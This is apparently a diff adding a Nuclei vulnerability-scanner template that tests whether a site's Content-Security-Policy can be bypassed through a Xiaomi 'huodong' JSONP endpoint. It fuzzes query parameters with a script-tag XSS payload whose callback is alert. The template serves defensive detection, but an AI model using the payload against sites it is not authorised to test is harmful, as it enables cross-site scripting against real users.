@@ -1,0 +1,55 @@
+id: mi-huodong-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Mi Huodong
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,mi-huodong,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "mi.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: mi_huodong_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "mi_huodong_csp_xss == true"
+# digest: 4a0a004730450220708515c17978bc1fba89e442ab519c44e27488945f8bd3e0d35108cfe1d64f5a022100ae7eca4789b831357c03bf4d01cf0c5a3576574eacb7081e0b5bca6dfa8dcf5a:922c64590222798bb761d5b6d8e72950
